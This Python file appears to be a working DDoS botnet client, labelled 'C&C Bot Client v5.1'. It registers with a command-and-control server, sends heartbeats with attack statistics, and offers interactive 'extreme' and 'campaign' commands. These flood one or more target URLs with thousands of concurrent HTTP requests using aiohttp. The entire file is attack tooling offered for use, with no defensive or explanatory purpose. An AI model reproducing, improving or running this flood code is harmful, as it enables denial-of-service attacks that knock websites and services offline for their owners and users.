#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Bot Client v5.1 - FIXED CONNECTION - FINAL EDITION ║
║  100+ Requests/0.1ms • LOCALHOST CONNECTION FIXED • Multi-Target    ║
╚════════════════════════════════════════════════════════════════════╝

Author: huynhthienphat
Date: 2025-11-23 14:18:54 UTC
Platform: Multi-OS
Version: 5.1 Fixed - Connection
"""

import asyncio
import aiohttp
import threading
import time
import sys
import uuid
import urllib3
import os
import socket
import platform
from datetime import datetime
from pathlib import Path
import psutil
import gc
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============= CONFIGURATION =============
SERVER_URL = "http://127.0.0.1:5000"  # FIX: Use 127.0.0.1 instead of localhost
BOT_ID = f"BOT-{str(uuid.uuid4())[:8]}"
BOT_NAME = socket.gethostname()
HEARTBEAT_INTERVAL = 3  # More frequent heartbeat
LOG_DIR = Path('./bot_logs')
LOG_DIR.mkdir(exist_ok=True)

# EXTREME SPEED SETTINGS
EXTREME_CONNECTIONS = 2000
BATCH_SIZE = 10000
CONNECTION_LIMIT = 2000
TIMEOUT = 1
CHUNK_SIZE = 64

# Global state
current_campaign = None
campaign_attacks = {}
attack_stats = {
    'total_sent': 0,
    'total_failed': 0,
    'start_time': None,
    'peak_rps': 0,
    'max_concurrent': 0,
    'requests_per_100ms': 0
}
CURRENT_USER = "huynhthienphat"
CURRENT_TIME = "2025-11-23 14:18:54"

class ExtremeSpeedBot:
    """Bot cực nhanh - 100+ req/0.1ms"""
    
    def __init__(self):
        self.running = True
        self.request_count = 0
        self.failed_count = 0
        self.start_time = time.time()
        self.loop = None
        self.last_100ms_count = 0
        self.last_100ms_time = time.time()
        self.concurrent_count = 0
        # FIX: Session with retry strategy
        self.session_requests = self._create_session()
    
    def _create_session(self):
        """Create session with retry strategy - FIX for connection issues"""
        session = requests.Session()
        
        # Retry strategy
        retry = Retry(
            total=3,
            backoff_factor=0.3,
            status_forcelist=(500, 502, 504),
            allowed_methods=("HEAD", "GET", "POST")
        )
        
        adapter = HTTPAdapter(max_retries=retry)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        return session
    
    async def make_request_extreme(self, session, url, sem):
        """Request tối ưu"""
        self.concurrent_count += 1
        attack_stats['max_concurrent'] = max(attack_stats['max_concurrent'], self.concurrent_count)
        
        async with sem:
            try:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=TIMEOUT, connect=0.5),
                    ssl=False,
                    allow_redirects=False,
                    headers={'User-Agent': 'Mozilla/5.0'}
                ) as resp:
                    _ = resp.status
                    self.request_count += 1
                    self.last_100ms_count += 1
                    
                    now = time.time()
                    elapsed_100ms = (now - self.last_100ms_time) * 1000
                    if elapsed_100ms >= 100:
                        attack_stats['requests_per_100ms'] = self.last_100ms_count
                        self.last_100ms_count = 0
                        self.last_100ms_time = now
                    
                    return True
            except:
                self.failed_count += 1
            finally:
                self.concurrent_count -= 1
            
            return False
    
    async def attack_extreme_fast(self, target, threads, total_requests):
        """Tấn công cực nhanh"""
        global attack_stats
        
        print(f"\n{'='*75}")
        print(f"🔥🔥🔥 EXTREME SPEED ATTACK 🔥🔥🔥")
        print(f"{'='*75}")
        print(f"Target: {target}")
        print(f"Threads: {threads}")
        print(f"Requests: {total_requests:,}")
        print(f"Goal: 100+ requests per 0.1ms")
        print(f"Time: {CURRENT_TIME} UTC")
        print(f"User: {CURRENT_USER}")
        print(f"{'='*75}\n")
        
        self.request_count = 0
        self.failed_count = 0
        self.concurrent_count = 0
        self.start_time = time.time()
        attack_stats['start_time'] = self.start_time
        attack_stats['total_sent'] = 0
        attack_stats['total_failed'] = 0
        attack_stats['max_concurrent'] = 0
        
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        connector = aiohttp.TCPConnector(
            limit=EXTREME_CONNECTIONS,
            limit_per_host=EXTREME_CONNECTIONS,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            tcp_nodelay=True,
            backoff_factor=0.01,
            force_close=True,
            keepalive_timeout=60
        )
        
        timeout = aiohttp.ClientTimeout(
            total=TIMEOUT,
            connect=0.5,
            sock_connect=0.3,
            sock_read=0.3
        )
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            sem = asyncio.Semaphore(threads)
            
            print("📊 Starting extreme speed attack...")
            print("⏱️  Measuring 100ms throughput...\n")
            
            tasks = [self.make_request_extreme(session, target, sem) for _ in range(total_requests)]
            
            completed = 0
            for task in asyncio.as_completed(tasks, timeout=None):
                try:
                    await task
                    completed += 1
                    
                    if completed % 1000 == 0:
                        elapsed = time.time() - self.start_time
                        current_rps = self.request_count / elapsed if elapsed > 0 else 0
                        req_per_100ms = attack_stats['requests_per_100ms']
                        
                        sys.stdout.write(
                            f"\r✓ {completed:,}/{total_requests:,} | "
                            f"RPS: {current_rps:,.0f} | "
                            f"100ms: {req_per_100ms:,}+ | "
                            f"Max: {attack_stats['max_concurrent']}"
                        )
                        sys.stdout.flush()
                    
                    if completed % BATCH_SIZE == 0:
                        gc.collect()
                except:
                    pass
        
        elapsed = time.time() - self.start_time
        final_rps = self.request_count / elapsed if elapsed > 0 else 0
        req_per_100ms = (self.request_count / elapsed * 100) if elapsed > 0 else 0
        
        print(f"\n\n{'='*75}")
        print(f"✓✓✓ EXTREME ATTACK COMPLETED ✓✓✓")
        print(f"{'='*75}")
        print(f"Duration: {elapsed:.4f}s")
        print(f"Total Sent: {self.request_count:,}")
        print(f"Average RPS: {final_rps:,.0f}")
        print(f"Requests/100ms: {req_per_100ms:,.0f}")
        print(f"{'='*75}\n")
        
        attack_stats['total_sent'] = self.request_count
        attack_stats['total_failed'] = self.failed_count
        attack_stats['peak_rps'] = final_rps
        
        return self.request_count, self.failed_count
    
    async def attack_multiple_extreme(self, campaign_name, targets, threads, requests_per_target):
        """Tấn công nhiều targets"""
        global current_campaign, campaign_attacks
        
        current_campaign = campaign_name
        campaign_attacks = {t: {'success': 0, 'failed': 0} for t in targets}
        
        print(f"\n{'='*75}")
        print(f"🚀🚀🚀 EXTREME CAMPAIGN 🚀🚀🚀")
        print(f"{'='*75}")
        print(f"Campaign: {campaign_name}")
        print(f"Targets: {len(targets)}")
        print(f"Total requests: {len(targets) * requests_per_target:,}")
        print(f"{'='*75}\n")
        
        tasks = []
        for target in targets:
            task = self.attack_extreme_fast(target, threads, requests_per_target)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        total_success = 0
        total_failed = 0
        
        for i, target in enumerate(targets):
            try:
                success, failed = results[i]
                campaign_attacks[target]['success'] = success
                campaign_attacks[target]['failed'] = failed
                total_success += success
                total_failed += failed
            except:
                pass
        
        print(f"\n{'='*75}")
        print(f"✓ CAMPAIGN COMPLETED")
        print(f"Total Sent: {total_success:,}")
        print(f"{'='*75}\n")
        
        current_campaign = None
    
    def print_banner(self):
        """In banner"""
        banner = f"""
╔════════════════════════════════════════════════════════════════════╗
║      Python C&C Bot Client v5.1 - EXTREME SPEED - FIXED            ║
║  100+ Requests/0.1ms • LOCALHOST CONNECTION FIXED • Terminal       ║
╚════════════════════════════════════════════════════════════════════╝

🤖 BOT INFORMATION:
   Name: {BOT_NAME}
   ID: {BOT_ID}
   User: {CURRENT_USER}
   Platform: {platform.system()}
   Time: {CURRENT_TIME} UTC

🌐 CONNECTION:
   Server: {SERVER_URL}
   Connection: TCP/HTTP
   Status: Attempting connection...

💡 COMMANDS:
   • extreme <url> <threads> <requests> - Ultra-fast attack
   • campaign <name> <urls> <threads> <requests> - Multi-target
   • status - Show status
   • help - Show help
   • exit - Exit

🔥 Ready for EXTREME speed attacks!
"""
        print(banner)
    
    def show_status(self):
        """Hiển thị trạng thái"""
        process = psutil.Process()
        mem_info = process.memory_info()
        
        elapsed = time.time() - attack_stats['start_time'] if attack_stats['start_time'] else 0
        current_rps = attack_stats['total_sent'] / elapsed if elapsed > 0 else 0
        
        status = f"""
{'='*75}
BOT STATUS
{'='*75}
Bot: {BOT_NAME} ({BOT_ID})
User: {CURRENT_USER}
Campaign: {current_campaign if current_campaign else 'None'}

Total Sent: {attack_stats['total_sent']:,}
Total Failed: {attack_stats['total_failed']:,}
Current RPS: {current_rps:,.0f}
Requests/100ms: {attack_stats['requests_per_100ms']:,}

Memory: {mem_info.rss / 1024 / 1024:.1f}MB
{'='*75}
"""
        print(status)
    
    def show_help(self):
        """Hiển thị trợ giúp"""
        help_text = f"""
{'='*75}
COMMANDS
{'='*75}

⚡ ULTRA-FAST ATTACK:
   extreme <url> <threads> <requests>
   Example: extreme http://example.com 1000 500000

🚀 MULTI-TARGET:
   campaign <name> <url1,url2,...> <threads> <requests>
   Example: campaign test http://a.com,http://b.com 1000 500000

📊 INFO:
   status - Show status
   help - Show help

🛑 EXIT:
   exit - Exit

{'='*75}
"""
        print(help_text)
    
    def run_interactive(self):
        """Interactive terminal"""
        self.print_banner()
        
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)
        
        while self.running:
            try:
                prompt = f"{CURRENT_USER}@{BOT_NAME}:~$ "
                sys.stdout.write(prompt)
                sys.stdout.flush()
                
                command = input().strip()
                
                if not command:
                    continue
                
                parts = command.split()
                cmd = parts[0].lower()
                
                if cmd == 'help':
                    self.show_help()
                elif cmd == 'status':
                    self.show_status()
                elif cmd == 'extreme':
                    if len(parts) >= 4:
                        target = parts[1]
                        threads = min(int(parts[2]), EXTREME_CONNECTIONS)
                        requests_count = int(parts[3])
                        
                        print(f"\n⚡ Starting attack...")
                        self.loop.run_until_complete(
                            self.attack_extreme_fast(target, threads, requests_count)
                        )
                    else:
                        print("Usage: extreme <url> <threads> <requests>")
                
                elif cmd == 'campaign':
                    if len(parts) >= 5:
                        name = parts[1]
                        targets = parts[2].split(',')
                        threads = min(int(parts[3]), EXTREME_CONNECTIONS)
                        requests_count = int(parts[4])
                        
                        print(f"\n🚀 Starting campaign...")
                        self.loop.run_until_complete(
                            self.attack_multiple_extreme(name, targets, threads, requests_count)
                        )
                    else:
                        print("Usage: campaign <name> <url1,url2,...> <threads> <requests>")
                
                elif cmd == 'exit':
                    print("\n👋 Goodbye!")
                    self.running = False
                
                else:
                    print(f"❌ Unknown command: {cmd}")
                
                gc.collect()
                
            except KeyboardInterrupt:
                print("\n\n👋 Exiting...")
                self.running = False
                break
            except Exception as e:
                print(f"❌ Error: {e}")

# ============= HELPER FUNCTIONS =============

def register_bot():
    """Đăng ký bot - FIX connection"""
    max_retries = 5
    retry_count = 0
    
    while retry_count < max_retries:
        try:
            print(f"\n[Attempt {retry_count + 1}/{max_retries}] Connecting to server {SERVER_URL}...")
            
            response = requests.post(
                f"{SERVER_URL}/api/bot/register",
                json={'botId': BOT_ID, 'botName': BOT_NAME},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                print(f"✓ Bot registered: {BOT_NAME}")
                print(f"✓ Server connection successful!\n")
                return True
            else:
                print(f"⚠️  Server returned code {response.status_code}")
                retry_count += 1
        
        except requests.exceptions.ConnectionError as e:
            print(f"❌ Connection failed: {e}")
            retry_count += 1
            if retry_count < max_retries:
                print(f"⏳ Retrying in 5 seconds... ({max_retries - retry_count} attempts left)")
                time.sleep(5)
        
        except Exception as e:
            print(f"❌ Error: {e}")
            retry_count += 1
            if retry_count < max_retries:
                time.sleep(5)
    
    print(f"\n⚠️  Warning: Could not connect to server after {max_retries} attempts")
    print(f"   Running in local-only mode\n")
    return False

def heartbeat():
    """Gửi heartbeat"""
    while True:
        try:
            requests.post(
                f"{SERVER_URL}/api/bot/heartbeat",
                json={
                    'botId': BOT_ID,
                    'botName': BOT_NAME,
                    'requests_sent': attack_stats['total_sent'],
                    'requests_failed': attack_stats['total_failed'],
                    'status': 'attacking' if current_campaign else 'idle',
                    'peak_rps': attack_stats['peak_rps'],
                    'max_concurrent': attack_stats['max_concurrent']
                },
                timeout=5,
                verify=False
            )
        except:
            pass
        
        time.sleep(HEARTBEAT_INTERVAL)

# ============= MAIN =============

def main():
    """Main function"""
    print("="*75)
    print(f"🤖 PYTHON C&C BOT CLIENT v5.1 - EXTREME SPEED - FIXED")
    print(f"🆔 Bot ID: {BOT_ID}")
    print(f"📝 Bot Name: {BOT_NAME}")
    print(f"👤 User: {CURRENT_USER}")
    print(f"⏰ Time: {CURRENT_TIME} UTC")
    print(f"📡 Server: {SERVER_URL}")
    print("="*75)
    
    registered = register_bot()
    if registered:
        hb_thread = threading.Thread(target=heartbeat, daemon=True)
        hb_thread.start()
    
    bot = ExtremeSpeedBot()
    bot.run_interactive()

if __name__ == "__main__":
    main()